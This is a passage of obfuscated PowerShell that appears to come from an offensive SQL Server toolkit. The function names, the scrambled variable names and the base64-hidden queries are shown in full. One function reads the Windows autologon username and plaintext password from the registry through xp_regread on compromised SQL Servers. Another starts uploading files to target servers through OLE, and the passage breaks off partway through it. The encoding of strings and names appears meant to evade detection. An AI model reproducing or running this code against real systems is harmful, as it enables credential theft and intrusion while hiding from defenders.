            Write-Host -InputObject $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAGwAZQAgAHAAYQB0AGgAIABkAG8AZQBzACAAbgBvAHQAIABhAHAAcABlAGEAcgAgAHQAbwAgAGIAZQAgAHYAYQBsAGkAZAAuAA==')))
            break
        }
        gc -Path $FilePath |
        % -Process {
            $Instance = $_
            if($Instance.Split(',')[1])
            {
                $ComputerName = $Instance.Split(',')[0]
            }
            else
            {
                $ComputerName = $Instance.Split('\')[0]
            }
            if($_ -ne '')
            {
                $null = ${/==\____/\/\/=\/\}.Rows.Add($ComputerName,$Instance)
            }
        }
    }
    End
    {
        ${/=\/\______/\/=\/} = ${/==\____/\/\/=\/\}.rows.count
        Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AC8APQBcAC8AXABfAF8AXwBfAF8AXwAvAFwALwA9AFwALwB9ACAAaQBuAHMAdABhAG4AYwBlAHMAIAB3AGgAZQByAGUAIABmAG8AdQBuAGQAIABpAG4AIAAkAEYAaQBsAGUAUABhAHQAaAAuAA==')))
        ${/==\____/\/\/=\/\}
    }
}
Function   Get-SQLRecoverPwAutoLogon
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )
    Begin
    {
        ${/=====\/\/==\_/\/} = New-Object -TypeName System.Data.DataTable
        ${/=====\/\/==\_/\/}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA')))) | Out-Null
        ${/=====\/\/==\_/\/}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHMAdABhAG4AYwBlAA==')))) | Out-Null
        ${/=====\/\/==\_/\/}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))) | Out-Null
        ${/=====\/\/==\_/\/}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBOAGEAbQBlAA==')))) | Out-Null
        ${/=====\/\/==\_/\/}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABhAHMAcwB3AG8AcgBkAA==')))) | Out-Null
    }
    Process
    {
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }
        ${__/\_/=\/==\_/=\_} = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | ? -FilterScript {
            $_.Status -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGMAZQBzAHMAaQBiAGwAZQA=')))
        }
        if(${__/\_/=\/==\_/=\_})
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQwBvAG4AbgBlAGMAdABpAG8AbgAgAFMAdQBjAGMAZQBzAHMALgA=')))
            }
        }
        else
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQwBvAG4AbgBlAGMAdABpAG8AbgAgAEYAYQBpAGwAZQBkAC4A')))
            }
            return
        }       
        ${__/\/==\____/\_/=} = Get-SQLSysadminCheck -Instance $Instance -Credential $Credential -Username $Username -Password $Password -SuppressVerbose | select -Property IsSysadmin -ExpandProperty IsSysadmin
        ${/=====\__/\/=\_/\} = Get-SQLServerInfo -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | select -Property SQLServerVersionNumber -ExpandProperty SQLServerVersionNumber
        if(${/=====\__/\/=\_/\})
        {
            ${_/\/=\/=\_______/} = ${/=====\__/\/=\_/\}.Split('.')[0]
        }
        if(${__/\/==\____/\_/=} -ne $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WQBlAHMA'))))
        {          
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAVABoAGkAcwAgAGYAdQBuAGMAdABpAG8AbgAgAHIAZQBxAHUAaQByAGUAcwAgAHMAeQBzAGEAZABtAGkAbgAgAHAAcgBpAHYAaQBsAGUAZwBlAHMALgAgAEQAbwBuAGUALgA=')))
            Return
        }
        ${_/\_/\/==\/===\__} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('DQAKACAAIAAgACAAIAAgACAAIAAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAA0ACgAgACAAIAAgACAAIAAgACAALQAtACAARwBlAHQAIABXAGkAbgBkAG8AdwBzACAAQQB1AHQAbwAgAEwAbwBnAGkAbgAgAEMAcgBlAGQAZQBuAHQAaQBhAGwAcwAgAGYAcgBvAG0AIAB0AGgAZQAgAFIAZQBnAGkAcwB0AHIAeQANAAoAIAAgACAAIAAgACAAIAAgAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ADQAKACAAIAAgACAAIAAgACAAIAAtAC0AIABHAGUAdAAgAEEAdQB0AG8ATABvAGcAaQBuACAARABlAGYAYQB1AGwAdAAgAEQAbwBtAGEAaQBuAA0ACgAgACAAIAAgACAAIAAgACAARABFAEMATABBAFIARQAgAEAAQQB1AHQAbwBMAG8AZwBpAG4ARABvAG0AYQBpAG4AIAAgAFMAWQBTAE4AQQBNAEUADQAKACAAIAAgACAAIAAgACAAIABFAFgARQBDAFUAVABFACAAbQBhAHMAdABlAHIALgBkAGIAbwAuAHgAcABfAHIAZQBnAHIAZQBhAGQADQAKACAAIAAgACAAIAAgACAAIABAAHIAbwBvAHQAawBlAHkACQAJAD0AIABOACcASABLAEUAWQBfAEwATwBDAEEATABfAE0AQQBDAEgASQBOAEUAJwAsAA0ACgAgACAAIAAgACAAIAAgACAAQABrAGUAeQAJAAkACQA9ACAATgAnAFMATwBGAFQAVwBBAFIARQBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwAgAE4AVABcAEMAdQByAHIAZQBuAHQAVgBlAHIAcwBpAG8AbgBcAFcAaQBuAGwAbwBnAG8AbgAnACwADQAKACAAIAAgACAAIAAgACAAIABAAHYAYQBsAHUAZQBfAG4AYQBtAGUACQAJAD0AIABOACcARABlAGYAYQB1AGwAdABEAG8AbQBhAGkAbgBOAGEAbQBlACcALAANAAoAIAAgACAAIAAgACAAIAAgAEAAdgBhAGwAdQBlAAkACQAJAD0AIABAAEEAdQB0AG8ATABvAGcAaQBuAEQAbwBtAGEAaQBuACAAbwB1AHQAcAB1AHQADQAKACAAIAAgACAAIAAgACAAIAAtAC0AIABHAGUAdAAgAEEAdQB0AG8ATABvAGcAaQBuACAARABlAGYAYQB1AGwAdABVAHMAZQByAG4AYQBtAGUADQAKACAAIAAgACAAIAAgACAAIABEAEUAQwBMAEEAUgBFACAAQABBAHUAdABvAEwAbwBnAGkAbgBVAHMAZQByACAAIABTAFkAUwBOAEEATQBFAA0ACgAgACAAIAAgACAAIAAgACAARQBYAEUAQwBVAFQARQAgAG0AYQBzAHQAZQByAC4AZABiAG8ALgB4AHAAXwByAGUAZwByAGUAYQBkAA0ACgAgACAAIAAgACAAIAAgACAAQAByAG8AbwB0AGsAZQB5AAkACQA9ACAATgAnAEgASwBFAFkAXwBMAE8AQwBBAEwAXwBNAEEAQwBIAEkATgBFACcALAANAAoAIAAgACAAIAAgACAAIAAgAEAAawBlAHkACQAJAAkAPQAgAE4AJwBTAE8ARgBUAFcAQQBSAEUAXABNAGkAYwByAG8AcwBvAGYAdABcAFcAaQBuAGQAbwB3AHMAIABOAFQAXABDAHUAcgByAGUAbgB0AFYAZQByAHMAaQBvAG4AXABXAGkAbgBsAG8AZwBvAG4AJwAsAA0ACgAgACAAIAAgACAAIAAgACAAQAB2AGEAbAB1AGUAXwBuAGEAbQBlAAkACQA9ACAATgAnAEQAZQBmAGEAdQBsAHQAVQBzAGUAcgBOAGEAbQBlACcALAANAAoAIAAgACAAIAAgACAAIAAgAEAAdgBhAGwAdQBlAAkACQAJAD0AIABAAEEAdQB0AG8ATABvAGcAaQBuAFUAcwBlAHIAIABvAHUAdABwAHUAdAANAAoAIAAgACAAIAAgACAAIAAgAC0ALQAgAEcAZQB0ACAAQQB1AHQAbwBMAG8AZwBpAG4AIABEAGUAZgBhAHUAbAB0AFUAcwBlAHIAbgBhAG0AZQANAAoAIAAgACAAIAAgACAAIAAgAEQARQBDAEwAQQBSAEUAIABAAEEAdQB0AG8ATABvAGcAaQBuAFAAYQBzAHMAdwBvAHIAZAAgACAAUwBZAFMATgBBAE0ARQANAAoAIAAgACAAIAAgACAAIAAgAEUAWABFAEMAVQBUAEUAIABtAGEAcwB0AGUAcgAuAGQAYgBvAC4AeABwAF8AcgBlAGcAcgBlAGEAZAANAAoAIAAgACAAIAAgACAAIAAgAEAAcgBvAG8AdABrAGUAeQAJAAkAPQAgAE4AJwBIAEsARQBZAF8ATABPAEMAQQBMAF8ATQBBAEMASABJAE4ARQAnACwADQAKACAAIAAgACAAIAAgACAAIABAAGsAZQB5AAkACQAJAD0AIABOACcAUwBPAEYAVABXAEEAUgBFAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzACAATgBUAFwAQwB1AHIAcgBlAG4AdABWAGUAcgBzAGkAbwBuAFwAVwBpAG4AbABvAGcAbwBuACcALAANAAoAIAAgACAAIAAgACAAIAAgAEAAdgBhAGwAdQBlAF8AbgBhAG0AZQAJAAkAPQAgAE4AJwBEAGUAZgBhAHUAbAB0AFAAYQBzAHMAdwBvAHIAZAAnACwADQAKACAAIAAgACAAIAAgACAAIABAAHYAYQBsAHUAZQAJAAkACQA9ACAAQABBAHUAdABvAEwAbwBnAGkAbgBQAGEAcwBzAHcAbwByAGQAIABvAHUAdABwAHUAdAANAAoAIAAgACAAIAAgACAAIAAgAC0ALQAgAEQAaQBzAHAAbABhAHkAIABSAGUAcwB1AGwAdABzAA0ACgAgACAAIAAgACAAIAAgACAAUwBFAEwARQBDAFQAIABEAG8AbQBhAGkAbgAgAD0AIABAAEEAdQB0AG8ATABvAGcAaQBuAEQAbwBtAGEAaQBuACwAIABVAHMAZQByAG4AYQBtAGUAIAA9ACAAQABBAHUAdABvAEwAbwBnAGkAbgBVAHMAZQByACwAIABQAGEAcwBzAHcAbwByAGQAIAA9ACAAQABBAHUAdABvAEwAbwBnAGkAbgBQAGEAcwBzAHcAbwByAGQA')))
        ${_/\__/\/=\/\/=\_/} = Get-SQLQuery -Instance $Instance -Query ${_/\_/\/==\/===\__} -Username $Username -Password $Password -Credential $Credential -SuppressVerbose     
        ${/=======\/====\__} = ${_/\__/\/=\/\/=\_/}.Username
        if(${/=======\/====\__}.length -ge 2){
            ${_/\__/\/=\/\/=\_/} | %{                
                ${/=====\/\/==\_/\/}.Rows.Add($ComputerName, $Instance,$_.Domain,$_.Username,$_.Password) | Out-Null
            }                    
        }else{
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAATgBvACAAZABlAGYAYQB1AGwAdAAgAGEAdQB0AG8AIABsAG8AZwBpAG4AIABjAHIAZQBkAGUAbgB0AGkAYQBsAHMAIABmAG8AdQBuAGQALgA=')))
        }
        ${_/\__/\/====\_/\/} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('DQAKACAAIAAgACAAIAAgACAAIAAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAA0ACgAgACAAIAAgACAAIAAgACAALQAtACAARwBlAHQAIABBAGwAdABlAHIAbgBhAHQAaQB2AGUAIABXAGkAbgBkAG8AdwBzACAAQQB1AHQAbwAgAEwAbwBnAGkAbgAgAEMAcgBlAGQAZQBuAHQAaQBhAGwAcwAgAGYAcgBvAG0AIAB0AGgAZQAgAFIAZQBnAGkAcwB0AHIAeQANAAoAIAAgACAAIAAgACAAIAAgAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ADQAKACAAIAAgACAAIAAgACAAIAAtAC0AIABHAGUAdAAgAEEAbAB0ACAAQQB1AHQAbwBMAG8AZwBpAG4AIABEAGUAZgBhAHUAbAB0ACAARABvAG0AYQBpAG4ADQAKACAAIAAgACAAIAAgACAAIABEAEUAQwBMAEEAUgBFACAAQABBAGwAdABBAHUAdABvAEwAbwBnAGkAbgBEAG8AbQBhAGkAbgAgACAAUwBZAFMATgBBAE0ARQANAAoAIAAgACAAIAAgACAAIAAgAEUAWABFAEMAVQBUAEUAIABtAGEAcwB0AGUAcgAuAGQAYgBvAC4AeABwAF8AcgBlAGcAcgBlAGEAZAANAAoAIAAgACAAIAAgACAAIAAgAEAAcgBvAG8AdABrAGUAeQAJAAkAPQAgAE4AJwBIAEsARQBZAF8ATABPAEMAQQBMAF8ATQBBAEMASABJAE4ARQAnACwADQAKACAAIAAgACAAIAAgACAAIABAAGsAZQB5AAkACQAJAD0AIABOACcAUwBPAEYAVABXAEEAUgBFAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzACAATgBUAFwAQwB1AHIAcgBlAG4AdABWAGUAcgBzAGkAbwBuAFwAVwBpAG4AbABvAGcAbwBuACcALAANAAoAIAAgACAAIAAgACAAIAAgAEAAdgBhAGwAdQBlAF8AbgBhAG0AZQAJAAkAPQAgAE4AJwBBAGwAdABEAGUAZgBhAHUAbAB0AEQAbwBtAGEAaQBuAE4AYQBtAGUAJwAsAA0ACgAgACAAIAAgACAAIAAgACAAQAB2AGEAbAB1AGUACQAJAAkAPQAgAEAAQQBsAHQAQQB1AHQAbwBMAG8AZwBpAG4ARABvAG0AYQBpAG4AIABvAHUAdABwAHUAdAANAAoAIAAgACAAIAAgACAAIAAgAC0ALQAgAEcAZQB0ACAAQQBsAHQAIABBAHUAdABvAEwAbwBnAGkAbgAgAEQAZQBmAGEAdQBsAHQAVQBzAGUAcgBuAGEAbQBlAA0ACgAgACAAIAAgACAAIAAgACAARABFAEMATABBAFIARQAgAEAAQQBsAHQAQQB1AHQAbwBMAG8AZwBpAG4AVQBzAGUAcgAgACAAUwBZAFMATgBBAE0ARQANAAoAIAAgACAAIAAgACAAIAAgAEUAWABFAEMAVQBUAEUAIABtAGEAcwB0AGUAcgAuAGQAYgBvAC4AeABwAF8AcgBlAGcAcgBlAGEAZAANAAoAIAAgACAAIAAgACAAIAAgAEAAcgBvAG8AdABrAGUAeQAJAAkAPQAgAE4AJwBIAEsARQBZAF8ATABPAEMAQQBMAF8ATQBBAEMASABJAE4ARQAnACwADQAKACAAIAAgACAAIAAgACAAIABAAGsAZQB5AAkACQAJAD0AIABOACcAUwBPAEYAVABXAEEAUgBFAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzACAATgBUAFwAQwB1AHIAcgBlAG4AdABWAGUAcgBzAGkAbwBuAFwAVwBpAG4AbABvAGcAbwBuACcALAANAAoAIAAgACAAIAAgACAAIAAgAEAAdgBhAGwAdQBlAF8AbgBhAG0AZQAJAAkAPQAgAE4AJwBBAGwAdABEAGUAZgBhAHUAbAB0AFUAcwBlAHIATgBhAG0AZQAnACwADQAKACAAIAAgACAAIAAgACAAIABAAHYAYQBsAHUAZQAJAAkACQA9ACAAQABBAGwAdABBAHUAdABvAEwAbwBnAGkAbgBVAHMAZQByACAAbwB1AHQAcAB1AHQADQAKACAAIAAgACAAIAAgACAAIAAtAC0AIABHAGUAdAAgAEEAbAB0ACAAQQB1AHQAbwBMAG8AZwBpAG4AIABEAGUAZgBhAHUAbAB0AFUAcwBlAHIAbgBhAG0AZQANAAoAIAAgACAAIAAgACAAIAAgAEQARQBDAEwAQQBSAEUAIABAAEEAbAB0AEEAdQB0AG8ATABvAGcAaQBuAFAAYQBzAHMAdwBvAHIAZAAgACAAUwBZAFMATgBBAE0ARQANAAoAIAAgACAAIAAgACAAIAAgAEUAWABFAEMAVQBUAEUAIABtAGEAcwB0AGUAcgAuAGQAYgBvAC4AeABwAF8AcgBlAGcAcgBlAGEAZAANAAoAIAAgACAAIAAgACAAIAAgAEAAcgBvAG8AdABrAGUAeQAJAAkAPQAgAE4AJwBIAEsARQBZAF8ATABPAEMAQQBMAF8ATQBBAEMASABJAE4ARQAnACwADQAKACAAIAAgACAAIAAgACAAIABAAGsAZQB5AAkACQAJAD0AIABOACcAUwBPAEYAVABXAEEAUgBFAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzACAATgBUAFwAQwB1AHIAcgBlAG4AdABWAGUAcgBzAGkAbwBuAFwAVwBpAG4AbABvAGcAbwBuACcALAANAAoAIAAgACAAIAAgACAAIAAgAEAAdgBhAGwAdQBlAF8AbgBhAG0AZQAJAAkAPQAgAE4AJwBBAGwAdABEAGUAZgBhAHUAbAB0AFAAYQBzAHMAdwBvAHIAZAAnACwADQAKACAAIAAgACAAIAAgACAAIABAAHYAYQBsAHUAZQAJAAkACQA9ACAAQABBAGwAdABBAHUAdABvAEwAbwBnAGkAbgBQAGEAcwBzAHcAbwByAGQAIABvAHUAdABwAHUAdAANAAoAIAAgACAAIAAgACAAIAAgAC0ALQAgAEQAaQBzAHAAbABhAHkAIABSAGUAcwB1AGwAdABzAA0ACgAgACAAIAAgACAAIAAgACAAUwBFAEwARQBDAFQAIABEAG8AbQBhAGkAbgAgAD0AIABAAEEAbAB0AEEAdQB0AG8ATABvAGcAaQBuAEQAbwBtAGEAaQBuACwAIABVAHMAZQByAG4AYQBtAGUAIAA9ACAAQABBAGwAdABBAHUAdABvAEwAbwBnAGkAbgBVAHMAZQByACwAIABQAGEAcwBzAHcAbwByAGQAIAA9ACAAQABBAGwAdABBAHUAdABvAEwAbwBnAGkAbgBQAGEAcwBzAHcAbwByAGQA')))
        ${_/==\/\___/=\/=\_} = Get-SQLQuery -Instance $Instance -Query ${_/\__/\/====\_/\/} -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
        ${/=\/=\_/\_/==\/==} = ${_/==\/\___/=\/=\_}.Username
        if(${/=\/=\_/\_/==\/==}.length -ge 2){                            
            ${_/==\/\___/=\/=\_} | %{               
                ${/=====\/\/==\_/\/}.Rows.Add($ComputerName, $Instance,$_.Domain,$_.Username,$_.Password) | Out-Null
            }
        }else{
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAATgBvACAAYQBsAHQAZQByAG4AYQB0AGkAdgBlACAAYQB1AHQAbwAgAGwAbwBnAGkAbgAgAGMAcgBlAGQAZQBuAHQAaQBhAGwAcwAgAGYAbwB1AG4AZAAuAA==')))
        }
    }
    End
    {
         ${/=====\/\/==\_/\/} 
    }
}
Function Get-SQLServerPolicy
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )
    Begin
    {
        ${/=\/\___/\/\_/\_/} = New-Object -TypeName System.Data.DataTable
    }
    Process
    {
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }
        ${__/\_/=\/==\_/=\_} = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | ? -FilterScript {
            $_.Status -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGMAZQBzAHMAaQBiAGwAZQA=')))
        }
        if(${__/\_/=\/==\_/=\_})
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQwBvAG4AbgBlAGMAdABpAG8AbgAgAFMAdQBjAGMAZQBzAHMALgA=')))
            }
        }
        else
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQwBvAG4AbgBlAGMAdABpAG8AbgAgAEYAYQBpAGwAZQBkAC4A')))
            }
            return
        }
        $Query = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IAAtAC0AIABHAGUAdAAtAFMAUQBMAFMAZQByAHYAZQByAFAAbwBsAGkAYwB5AC4AcwBxAGwAIAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABTAEUATABFAEMAVAAgACcAJABDAG8AbQBwAHUAdABlAHIATgBhAG0AZQAnACAAYQBzACAAWwBDAG8AbQBwAHUAdABlAHIATgBhAG0AZQBdACwADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJwAkAEkAbgBzAHQAYQBuAGMAZQAnACAAYQBzACAAWwBJAG4AcwB0AGEAbgBjAGUAXQAsAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAcAAuAHAAbwBsAGkAYwB5AF8AaQBkACwADQAKAAkACQAgACAAIAAgACAAIAAgACAAIAAgACAAIABwAC4AbgBhAG0AZQAgAGEAcwAgAFsAUABvAGwAaQBjAHkATgBhAG0AZQBdACwADQAKAAkACQAgACAAIAAgACAAIAAgACAAIAAgACAAIABwAC4AYwBvAG4AZABpAHQAaQBvAG4AXwBpAGQALAANAAoACQAJACAAIAAgACAAIAAgACAAIAAgACAAIAAgAGMALgBuAGEAbQBlACAAYQBzACAAWwBDAG8AbgBkAGkAdABpAG8AbgBOAGEAbQBlAF0ALAANAAoACQAJACAAIAAgACAAIAAgACAAIAAgACAAIAAgAGMALgBmAGEAYwBlAHQALAANAAoACQAJACAAIAAgACAAIAAgACAAIAAgACAAIAAgAGMALgBlAHgAcAByAGUAcwBzAGkAbwBuACAAYQBzACAAWwBDAG8AbgBkAGkAdABpAG8AbgBFAHgAcAByAGUAcwBzAGkAbwBuAF0ALAANAAoACQAJACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHAALgByAG8AbwB0AF8AYwBvAG4AZABpAHQAaQBvAG4AXwBpAGQALAANAAoACQAJACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHAALgBpAHMAXwBlAG4AYQBiAGwAZQBkACwADQAKAAkACQAgACAAIAAgACAAIAAgACAAIAAgACAAIABwAC4AZABhAHQAZQBfAGMAcgBlAGEAdABlAGQALAANAAoACQAJACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHAALgBkAGEAdABlAF8AbQBvAGQAaQBmAGkAZQBkACwADQAKAAkACQAgACAAIAAgACAAIAAgACAAIAAgACAAIABwAC4AZABlAHMAYwByAGkAcAB0AGkAbwBuACwAIAANAAoACQAJACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHAALgBjAHIAZQBhAHQAZQBkAF8AYgB5ACwAIAANAAoACQAJACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHAALgBpAHMAXwBzAHkAcwB0AGUAbQAsAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAdAAuAHQAYQByAGcAZQB0AF8AcwBlAHQAXwBpAGQALAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHQALgBUAFkAUABFACwADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAB0AC4AdAB5AHAAZQBfAHMAawBlAGwAZQB0AG8AbgANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABGAFIATwBNACAAbQBzAGQAYgAuAGQAYgBvAC4AcwB5AHMAcABvAGwAaQBjAHkAXwBwAG8AbABpAGMAaQBlAHMAIABwAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAEkATgBOAEUAUgAgAEoATwBJAE4AIABtAHMAZABiAC4AZABiAG8ALgBzAHkAcwBwAG8AbABpAGMAeQBfAGMAbwBuAGQAaQB0AGkAbwBuAHMAIABjACAADQAKAAkAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABPAE4AIABwAC4AYwBvAG4AZABpAHQAaQBvAG4AXwBpAGQAIAA9ACAAYwAuAGMAbwBuAGQAaQB0AGkAbwBuAF8AaQBkAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAEkATgBOAEUAUgAgAEoATwBJAE4AIABtAHMAZABiAC4AZABiAG8ALgBzAHkAcwBwAG8AbABpAGMAeQBfAHQAYQByAGcAZQB0AF8AcwBlAHQAcwAgAHQADQAKAAkAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABPAE4AIAB0AC4AbwBiAGoAZQBjAHQAXwBzAGUAdABfAGkAZAAgAD0AIABwAC4AbwBiAGoAZQBjAHQAXwBzAGUAdABfAGkAZAA=')))
        ${/=\/=\__/=\__/=\/} = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
        ${/=\/\___/\/\_/\_/} = ${/=\/\___/\/\_/\_/} + ${/=\/=\__/=\__/=\/}
    }
    End
    {
        ${______/=\_/\/=\_/} = ${/=\/\___/\/\_/\_/}.Count
        if(${______/=\_/\/=\_/} -eq 0){
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAATgBvACAAcABvAGwAaQBjAGkAZQBzACAAZgBvAHUAbgBkAC4A')))
            }
        }
        ${/=\/\___/\/\_/\_/}
    }
}

Function  Invoke-SQLUploadFileOle
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $false,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Connect using Dedicated Admin Connection.')]
        [Switch]$DAC,
        [Parameter(Mandatory = $true,
        HelpMessage = 'Input local file to be uploaded to target server.')]
        [ValidateScript({
                    Test-Path $_ -PathType leaf
        })]
        [String]$InputFile = "",
        [Parameter(Mandatory = $true,
        HelpMessage = 'Destination file path where the file should be uploaded on the remote server.')]
        [String]$OutputFile = "",
        [Parameter(Mandatory = $false,
